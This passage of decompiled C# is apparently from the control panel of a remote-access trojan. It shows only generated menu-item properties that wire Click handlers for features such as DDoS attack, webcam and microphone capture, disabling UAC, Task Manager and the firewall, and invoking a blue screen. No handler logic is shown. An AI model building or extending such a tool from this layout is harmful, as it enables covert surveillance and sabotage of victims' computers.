					installedProgramsToolStripMenuItem.Click -= value2;
				}
				this._InstalledProgramsToolStripMenuItem1 = value;
				installedProgramsToolStripMenuItem = this._InstalledProgramsToolStripMenuItem1;
				if (installedProgramsToolStripMenuItem != null)
				{
					installedProgramsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000165 RID: 357
		// (get) Token: 0x0600036C RID: 876 RVA: 0x0002243F File Offset: 0x0002063F
		// (set) Token: 0x0600036D RID: 877 RVA: 0x0002244C File Offset: 0x0002064C
		internal virtual ToolStripMenuItem DDosAttackToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._DDosAttackToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DDosAttackToolStripMenuItem1_Click);
				ToolStripMenuItem ddosAttackToolStripMenuItem = this._DDosAttackToolStripMenuItem1;
				if (ddosAttackToolStripMenuItem != null)
				{
					ddosAttackToolStripMenuItem.Click -= value2;
				}
				this._DDosAttackToolStripMenuItem1 = value;
				ddosAttackToolStripMenuItem = this._DDosAttackToolStripMenuItem1;
				if (ddosAttackToolStripMenuItem != null)
				{
					ddosAttackToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000166 RID: 358
		// (get) Token: 0x0600036E RID: 878 RVA: 0x0002248F File Offset: 0x0002068F
		// (set) Token: 0x0600036F RID: 879 RVA: 0x0002249C File Offset: 0x0002069C
		internal virtual ToolStripMenuItem VBNetCompilerToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._VBNetCompilerToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.VBNetCompilerToolStripMenuItem1_Click);
				ToolStripMenuItem vbnetCompilerToolStripMenuItem = this._VBNetCompilerToolStripMenuItem1;
				if (vbnetCompilerToolStripMenuItem != null)
				{
					vbnetCompilerToolStripMenuItem.Click -= value2;
				}
				this._VBNetCompilerToolStripMenuItem1 = value;
				vbnetCompilerToolStripMenuItem = this._VBNetCompilerToolStripMenuItem1;
				if (vbnetCompilerToolStripMenuItem != null)
				{
					vbnetCompilerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000167 RID: 359
		// (get) Token: 0x06000370 RID: 880 RVA: 0x000224DF File Offset: 0x000206DF
		// (set) Token: 0x06000371 RID: 881 RVA: 0x000224EC File Offset: 0x000206EC
		internal virtual ToolStripMenuItem LocationManagerToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._LocationManagerToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.LocationManagerToolStripMenuItem_Click);
				ToolStripMenuItem locationManagerToolStripMenuItem = this._LocationManagerToolStripMenuItem;
				if (locationManagerToolStripMenuItem != null)
				{
					locationManagerToolStripMenuItem.Click -= value2;
				}
				this._LocationManagerToolStripMenuItem = value;
				locationManagerToolStripMenuItem = this._LocationManagerToolStripMenuItem;
				if (locationManagerToolStripMenuItem != null)
				{
					locationManagerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000168 RID: 360
		// (get) Token: 0x06000372 RID: 882 RVA: 0x0002252F File Offset: 0x0002072F
		// (set) Token: 0x06000373 RID: 883 RVA: 0x0002253C File Offset: 0x0002073C
		internal virtual ToolStripMenuItem PastimeToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._PastimeToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PastimeToolStripMenuItem1_Click);
				ToolStripMenuItem pastimeToolStripMenuItem = this._PastimeToolStripMenuItem1;
				if (pastimeToolStripMenuItem != null)
				{
					pastimeToolStripMenuItem.Click -= value2;
				}
				this._PastimeToolStripMenuItem1 = value;
				pastimeToolStripMenuItem = this._PastimeToolStripMenuItem1;
				if (pastimeToolStripMenuItem != null)
				{
					pastimeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000169 RID: 361
		// (get) Token: 0x06000374 RID: 884 RVA: 0x0002257F File Offset: 0x0002077F
		// (set) Token: 0x06000375 RID: 885 RVA: 0x00022589 File Offset: 0x00020789
		internal virtual ToolStripMenuItem Extra1ToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700016A RID: 362
		// (get) Token: 0x06000376 RID: 886 RVA: 0x00022592 File Offset: 0x00020792
		// (set) Token: 0x06000377 RID: 887 RVA: 0x0002259C File Offset: 0x0002079C
		internal virtual ToolStripMenuItem Extra2ToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700016B RID: 363
		// (get) Token: 0x06000378 RID: 888 RVA: 0x000225A5 File Offset: 0x000207A5
		// (set) Token: 0x06000379 RID: 889 RVA: 0x000225AF File Offset: 0x000207AF
		internal virtual ToolStripMenuItem ClientToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700016C RID: 364
		// (get) Token: 0x0600037A RID: 890 RVA: 0x000225B8 File Offset: 0x000207B8
		// (set) Token: 0x0600037B RID: 891 RVA: 0x000225C4 File Offset: 0x000207C4
		internal virtual ToolStripMenuItem ClientFolderToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ClientFolderToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ClientFolderToolStripMenuItem_Click);
				ToolStripMenuItem clientFolderToolStripMenuItem = this._ClientFolderToolStripMenuItem;
				if (clientFolderToolStripMenuItem != null)
				{
					clientFolderToolStripMenuItem.Click -= value2;
				}
				this._ClientFolderToolStripMenuItem = value;
				clientFolderToolStripMenuItem = this._ClientFolderToolStripMenuItem;
				if (clientFolderToolStripMenuItem != null)
				{
					clientFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700016D RID: 365
		// (get) Token: 0x0600037C RID: 892 RVA: 0x00022607 File Offset: 0x00020807
		// (set) Token: 0x0600037D RID: 893 RVA: 0x00022614 File Offset: 0x00020814
		internal virtual ToolStripMenuItem RestartToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RestartToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestartToolStripMenuItem_Click);
				ToolStripMenuItem restartToolStripMenuItem = this._RestartToolStripMenuItem;
				if (restartToolStripMenuItem != null)
				{
					restartToolStripMenuItem.Click -= value2;
				}
				this._RestartToolStripMenuItem = value;
				restartToolStripMenuItem = this._RestartToolStripMenuItem;
				if (restartToolStripMenuItem != null)
				{
					restartToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700016E RID: 366
		// (get) Token: 0x0600037E RID: 894 RVA: 0x00022657 File Offset: 0x00020857
		// (set) Token: 0x0600037F RID: 895 RVA: 0x00022664 File Offset: 0x00020864
		internal virtual ToolStripMenuItem CloseToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._CloseToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CloseToolStripMenuItem1_Click);
				ToolStripMenuItem closeToolStripMenuItem = this._CloseToolStripMenuItem1;
				if (closeToolStripMenuItem != null)
				{
					closeToolStripMenuItem.Click -= value2;
				}
				this._CloseToolStripMenuItem1 = value;
				closeToolStripMenuItem = this._CloseToolStripMenuItem1;
				if (closeToolStripMenuItem != null)
				{
					closeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700016F RID: 367
		// (get) Token: 0x06000380 RID: 896 RVA: 0x000226A7 File Offset: 0x000208A7
		// (set) Token: 0x06000381 RID: 897 RVA: 0x000226B4 File Offset: 0x000208B4
		internal virtual ToolStripMenuItem UninstallToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._UninstallToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UninstallToolStripMenuItem1_Click);
				ToolStripMenuItem uninstallToolStripMenuItem = this._UninstallToolStripMenuItem1;
				if (uninstallToolStripMenuItem != null)
				{
					uninstallToolStripMenuItem.Click -= value2;
				}
				this._UninstallToolStripMenuItem1 = value;
				uninstallToolStripMenuItem = this._UninstallToolStripMenuItem1;
				if (uninstallToolStripMenuItem != null)
				{
					uninstallToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000170 RID: 368
		// (get) Token: 0x06000382 RID: 898 RVA: 0x000226F7 File Offset: 0x000208F7
		// (set) Token: 0x06000383 RID: 899 RVA: 0x00022704 File Offset: 0x00020904
		internal virtual ToolStripMenuItem UpdateToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._UpdateToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UpdateToolStripMenuItem1_Click);
				ToolStripMenuItem updateToolStripMenuItem = this._UpdateToolStripMenuItem1;
				if (updateToolStripMenuItem != null)
				{
					updateToolStripMenuItem.Click -= value2;
				}
				this._UpdateToolStripMenuItem1 = value;
				updateToolStripMenuItem = this._UpdateToolStripMenuItem1;
				if (updateToolStripMenuItem != null)
				{
					updateToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000171 RID: 369
		// (get) Token: 0x06000384 RID: 900 RVA: 0x00022747 File Offset: 0x00020947
		// (set) Token: 0x06000385 RID: 901 RVA: 0x00022754 File Offset: 0x00020954
		internal virtual ToolStripMenuItem NoteToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._NoteToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NoteToolStripMenuItem1_Click);
				ToolStripMenuItem noteToolStripMenuItem = this._NoteToolStripMenuItem1;
				if (noteToolStripMenuItem != null)
				{
					noteToolStripMenuItem.Click -= value2;
				}
				this._NoteToolStripMenuItem1 = value;
				noteToolStripMenuItem = this._NoteToolStripMenuItem1;
				if (noteToolStripMenuItem != null)
				{
					noteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000172 RID: 370
		// (get) Token: 0x06000386 RID: 902 RVA: 0x00022797 File Offset: 0x00020997
		// (set) Token: 0x06000387 RID: 903 RVA: 0x000227A1 File Offset: 0x000209A1
		internal virtual ToolStripMenuItem PowerToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000173 RID: 371
		// (get) Token: 0x06000388 RID: 904 RVA: 0x000227AA File Offset: 0x000209AA
		// (set) Token: 0x06000389 RID: 905 RVA: 0x000227B4 File Offset: 0x000209B4
		internal virtual ToolStripMenuItem MonitorToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._MonitorToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MonitorToolStripMenuItem_Click);
				ToolStripMenuItem monitorToolStripMenuItem = this._MonitorToolStripMenuItem;
				if (monitorToolStripMenuItem != null)
				{
					monitorToolStripMenuItem.Click -= value2;
				}
				this._MonitorToolStripMenuItem = value;
				monitorToolStripMenuItem = this._MonitorToolStripMenuItem;
				if (monitorToolStripMenuItem != null)
				{
					monitorToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000174 RID: 372
		// (get) Token: 0x0600038A RID: 906 RVA: 0x000227F7 File Offset: 0x000209F7
		// (set) Token: 0x0600038B RID: 907 RVA: 0x00022804 File Offset: 0x00020A04
		internal virtual ToolStripMenuItem WebCamToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._WebCamToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.WebCamToolStripMenuItem1_Click);
				ToolStripMenuItem webCamToolStripMenuItem = this._WebCamToolStripMenuItem1;
				if (webCamToolStripMenuItem != null)
				{
					webCamToolStripMenuItem.Click -= value2;
				}
				this._WebCamToolStripMenuItem1 = value;
				webCamToolStripMenuItem = this._WebCamToolStripMenuItem1;
				if (webCamToolStripMenuItem != null)
				{
					webCamToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000175 RID: 373
		// (get) Token: 0x0600038C RID: 908 RVA: 0x00022847 File Offset: 0x00020A47
		// (set) Token: 0x0600038D RID: 909 RVA: 0x00022854 File Offset: 0x00020A54
		internal virtual ToolStripMenuItem MicrophoneToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._MicrophoneToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MicrophoneToolStripMenuItem1_Click);
				ToolStripMenuItem microphoneToolStripMenuItem = this._MicrophoneToolStripMenuItem1;
				if (microphoneToolStripMenuItem != null)
				{
					microphoneToolStripMenuItem.Click -= value2;
				}
				this._MicrophoneToolStripMenuItem1 = value;
				microphoneToolStripMenuItem = this._MicrophoneToolStripMenuItem1;
				if (microphoneToolStripMenuItem != null)
				{
					microphoneToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000176 RID: 374
		// (get) Token: 0x0600038E RID: 910 RVA: 0x00022897 File Offset: 0x00020A97
		// (set) Token: 0x0600038F RID: 911 RVA: 0x000228A4 File Offset: 0x00020AA4
		internal virtual ToolStripMenuItem SystemSoundToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._SystemSoundToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SystemSoundToolStripMenuItem1_Click);
				ToolStripMenuItem systemSoundToolStripMenuItem = this._SystemSoundToolStripMenuItem1;
				if (systemSoundToolStripMenuItem != null)
				{
					systemSoundToolStripMenuItem.Click -= value2;
				}
				this._SystemSoundToolStripMenuItem1 = value;
				systemSoundToolStripMenuItem = this._SystemSoundToolStripMenuItem1;
				if (systemSoundToolStripMenuItem != null)
				{
					systemSoundToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000177 RID: 375
		// (get) Token: 0x06000390 RID: 912 RVA: 0x000228E7 File Offset: 0x00020AE7
		// (set) Token: 0x06000391 RID: 913 RVA: 0x000228F1 File Offset: 0x00020AF1
		internal virtual ToolStripMenuItem PowerToolStripMenuItem2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000178 RID: 376
		// (get) Token: 0x06000392 RID: 914 RVA: 0x000228FA File Offset: 0x00020AFA
		// (set) Token: 0x06000393 RID: 915 RVA: 0x00022904 File Offset: 0x00020B04
		internal virtual ToolStripMenuItem BlankScreenToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000179 RID: 377
		// (get) Token: 0x06000394 RID: 916 RVA: 0x0002290D File Offset: 0x00020B0D
		// (set) Token: 0x06000395 RID: 917 RVA: 0x00022918 File Offset: 0x00020B18
		internal virtual ToolStripMenuItem EnableToolStripMenuItem6
		{
			[CompilerGenerated]
			get
			{
				return this._EnableToolStripMenuItem6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EnableToolStripMenuItem6_Click);
				ToolStripMenuItem enableToolStripMenuItem = this._EnableToolStripMenuItem6;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click -= value2;
				}
				this._EnableToolStripMenuItem6 = value;
				enableToolStripMenuItem = this._EnableToolStripMenuItem6;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700017A RID: 378
		// (get) Token: 0x06000396 RID: 918 RVA: 0x0002295B File Offset: 0x00020B5B
		// (set) Token: 0x06000397 RID: 919 RVA: 0x00022968 File Offset: 0x00020B68
		internal virtual ToolStripMenuItem DisableToolStripMenuItem6
		{
			[CompilerGenerated]
			get
			{
				return this._DisableToolStripMenuItem6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DisableToolStripMenuItem6_Click);
				ToolStripMenuItem disableToolStripMenuItem = this._DisableToolStripMenuItem6;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click -= value2;
				}
				this._DisableToolStripMenuItem6 = value;
				disableToolStripMenuItem = this._DisableToolStripMenuItem6;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700017B RID: 379
		// (get) Token: 0x06000398 RID: 920 RVA: 0x000229AB File Offset: 0x00020BAB
		// (set) Token: 0x06000399 RID: 921 RVA: 0x000229B5 File Offset: 0x00020BB5
		internal virtual ToolStripMenuItem UACToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700017C RID: 380
		// (get) Token: 0x0600039A RID: 922 RVA: 0x000229BE File Offset: 0x00020BBE
		// (set) Token: 0x0600039B RID: 923 RVA: 0x000229C8 File Offset: 0x00020BC8
		internal virtual ToolStripMenuItem EnableToolStripMenuItem7
		{
			[CompilerGenerated]
			get
			{
				return this._EnableToolStripMenuItem7;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EnableToolStripMenuItem7_Click);
				ToolStripMenuItem enableToolStripMenuItem = this._EnableToolStripMenuItem7;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click -= value2;
				}
				this._EnableToolStripMenuItem7 = value;
				enableToolStripMenuItem = this._EnableToolStripMenuItem7;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700017D RID: 381
		// (get) Token: 0x0600039C RID: 924 RVA: 0x00022A0B File Offset: 0x00020C0B
		// (set) Token: 0x0600039D RID: 925 RVA: 0x00022A18 File Offset: 0x00020C18
		internal virtual ToolStripMenuItem DisableToolStripMenuItem7
		{
			[CompilerGenerated]
			get
			{
				return this._DisableToolStripMenuItem7;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DisableToolStripMenuItem7_Click);
				ToolStripMenuItem disableToolStripMenuItem = this._DisableToolStripMenuItem7;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click -= value2;
				}
				this._DisableToolStripMenuItem7 = value;
				disableToolStripMenuItem = this._DisableToolStripMenuItem7;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700017E RID: 382
		// (get) Token: 0x0600039E RID: 926 RVA: 0x00022A5B File Offset: 0x00020C5B
		// (set) Token: 0x0600039F RID: 927 RVA: 0x00022A65 File Offset: 0x00020C65
		internal virtual ToolStripMenuItem RegeditToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700017F RID: 383
		// (get) Token: 0x060003A0 RID: 928 RVA: 0x00022A6E File Offset: 0x00020C6E
		// (set) Token: 0x060003A1 RID: 929 RVA: 0x00022A78 File Offset: 0x00020C78
		internal virtual ToolStripMenuItem EnableToolStripMenuItem8
		{
			[CompilerGenerated]
			get
			{
				return this._EnableToolStripMenuItem8;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EnableToolStripMenuItem8_Click);
				ToolStripMenuItem enableToolStripMenuItem = this._EnableToolStripMenuItem8;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click -= value2;
				}
				this._EnableToolStripMenuItem8 = value;
				enableToolStripMenuItem = this._EnableToolStripMenuItem8;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000180 RID: 384
		// (get) Token: 0x060003A2 RID: 930 RVA: 0x00022ABB File Offset: 0x00020CBB
		// (set) Token: 0x060003A3 RID: 931 RVA: 0x00022AC8 File Offset: 0x00020CC8
		internal virtual ToolStripMenuItem DisableToolStripMenuItem8
		{
			[CompilerGenerated]
			get
			{
				return this._DisableToolStripMenuItem8;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DisableToolStripMenuItem8_Click);
				ToolStripMenuItem disableToolStripMenuItem = this._DisableToolStripMenuItem8;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click -= value2;
				}
				this._DisableToolStripMenuItem8 = value;
				disableToolStripMenuItem = this._DisableToolStripMenuItem8;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000181 RID: 385
		// (get) Token: 0x060003A4 RID: 932 RVA: 0x00022B0B File Offset: 0x00020D0B
		// (set) Token: 0x060003A5 RID: 933 RVA: 0x00022B15 File Offset: 0x00020D15
		internal virtual ToolStripMenuItem TaskMgrToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000182 RID: 386
		// (get) Token: 0x060003A6 RID: 934 RVA: 0x00022B1E File Offset: 0x00020D1E
		// (set) Token: 0x060003A7 RID: 935 RVA: 0x00022B28 File Offset: 0x00020D28
		internal virtual ToolStripMenuItem EnableToolStripMenuItem9
		{
			[CompilerGenerated]
			get
			{
				return this._EnableToolStripMenuItem9;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EnableToolStripMenuItem9_Click);
				ToolStripMenuItem enableToolStripMenuItem = this._EnableToolStripMenuItem9;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click -= value2;
				}
				this._EnableToolStripMenuItem9 = value;
				enableToolStripMenuItem = this._EnableToolStripMenuItem9;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000183 RID: 387
		// (get) Token: 0x060003A8 RID: 936 RVA: 0x00022B6B File Offset: 0x00020D6B
		// (set) Token: 0x060003A9 RID: 937 RVA: 0x00022B78 File Offset: 0x00020D78
		internal virtual ToolStripMenuItem DisableToolStripMenuItem9
		{
			[CompilerGenerated]
			get
			{
				return this._DisableToolStripMenuItem9;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DisableToolStripMenuItem9_Click);
				ToolStripMenuItem disableToolStripMenuItem = this._DisableToolStripMenuItem9;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click -= value2;
				}
				this._DisableToolStripMenuItem9 = value;
				disableToolStripMenuItem = this._DisableToolStripMenuItem9;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000184 RID: 388
		// (get) Token: 0x060003AA RID: 938 RVA: 0x00022BBB File Offset: 0x00020DBB
		// (set) Token: 0x060003AB RID: 939 RVA: 0x00022BC5 File Offset: 0x00020DC5
		internal virtual ToolStripMenuItem FirewallToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000185 RID: 389
		// (get) Token: 0x060003AC RID: 940 RVA: 0x00022BCE File Offset: 0x00020DCE
		// (set) Token: 0x060003AD RID: 941 RVA: 0x00022BD8 File Offset: 0x00020DD8
		internal virtual ToolStripMenuItem EnableToolStripMenuItem10
		{
			[CompilerGenerated]
			get
			{
				return this._EnableToolStripMenuItem10;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EnableToolStripMenuItem10_Click);
				ToolStripMenuItem enableToolStripMenuItem = this._EnableToolStripMenuItem10;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click -= value2;
				}
				this._EnableToolStripMenuItem10 = value;
				enableToolStripMenuItem = this._EnableToolStripMenuItem10;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000186 RID: 390
		// (get) Token: 0x060003AE RID: 942 RVA: 0x00022C1B File Offset: 0x00020E1B
		// (set) Token: 0x060003AF RID: 943 RVA: 0x00022C28 File Offset: 0x00020E28
		internal virtual ToolStripMenuItem DisableToolStripMenuItem10
		{
			[CompilerGenerated]
			get
			{
				return this._DisableToolStripMenuItem10;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DisableToolStripMenuItem10_Click);
				ToolStripMenuItem disableToolStripMenuItem = this._DisableToolStripMenuItem10;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click -= value2;
				}
				this._DisableToolStripMenuItem10 = value;
				disableToolStripMenuItem = this._DisableToolStripMenuItem10;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000187 RID: 391
		// (get) Token: 0x060003B0 RID: 944 RVA: 0x00022C6B File Offset: 0x00020E6B
		// (set) Token: 0x060003B1 RID: 945 RVA: 0x00022C75 File Offset: 0x00020E75
		internal virtual ToolStripMenuItem UpdateToolStripMenuItem2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000188 RID: 392
		// (get) Token: 0x060003B2 RID: 946 RVA: 0x00022C7E File Offset: 0x00020E7E
		// (set) Token: 0x060003B3 RID: 947 RVA: 0x00022C88 File Offset: 0x00020E88
		internal virtual ToolStripMenuItem EnableToolStripMenuItem11
		{
			[CompilerGenerated]
			get
			{
				return this._EnableToolStripMenuItem11;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EnableToolStripMenuItem11_Click);
				ToolStripMenuItem enableToolStripMenuItem = this._EnableToolStripMenuItem11;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click -= value2;
				}
				this._EnableToolStripMenuItem11 = value;
				enableToolStripMenuItem = this._EnableToolStripMenuItem11;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000189 RID: 393
		// (get) Token: 0x060003B4 RID: 948 RVA: 0x00022CCB File Offset: 0x00020ECB
		// (set) Token: 0x060003B5 RID: 949 RVA: 0x00022CD8 File Offset: 0x00020ED8
		internal virtual ToolStripMenuItem DisableToolStripMenuItem11
		{
			[CompilerGenerated]
			get
			{
				return this._DisableToolStripMenuItem11;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DisableToolStripMenuItem11_Click);
				ToolStripMenuItem disableToolStripMenuItem = this._DisableToolStripMenuItem11;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click -= value2;
				}
				this._DisableToolStripMenuItem11 = value;
				disableToolStripMenuItem = this._DisableToolStripMenuItem11;
				if (disableToolStripMenuItem != null)
				{
					disableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700018A RID: 394
		// (get) Token: 0x060003B6 RID: 950 RVA: 0x00022D1B File Offset: 0x00020F1B
		// (set) Token: 0x060003B7 RID: 951 RVA: 0x00022D28 File Offset: 0x00020F28
		internal virtual ToolStripMenuItem ResetScaleToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ResetScaleToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ResetScaleToolStripMenuItem1_Click);
				ToolStripMenuItem resetScaleToolStripMenuItem = this._ResetScaleToolStripMenuItem1;
				if (resetScaleToolStripMenuItem != null)
				{
					resetScaleToolStripMenuItem.Click -= value2;
				}
				this._ResetScaleToolStripMenuItem1 = value;
				resetScaleToolStripMenuItem = this._ResetScaleToolStripMenuItem1;
				if (resetScaleToolStripMenuItem != null)
				{
					resetScaleToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700018B RID: 395
		// (get) Token: 0x060003B8 RID: 952 RVA: 0x00022D6B File Offset: 0x00020F6B
		// (set) Token: 0x060003B9 RID: 953 RVA: 0x00022D78 File Offset: 0x00020F78
		internal virtual ToolStripMenuItem InvokeBSODToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._InvokeBSODToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.InvokeBSODToolStripMenuItem1_Click);
				ToolStripMenuItem invokeBSODToolStripMenuItem = this._InvokeBSODToolStripMenuItem1;
				if (invokeBSODToolStripMenuItem != null)
				{
					invokeBSODToolStripMenuItem.Click -= value2;
				}
				this._InvokeBSODToolStripMenuItem1 = value;
				invokeBSODToolStripMenuItem = this._InvokeBSODToolStripMenuItem1;
				if (invokeBSODToolStripMenuItem != null)
				{
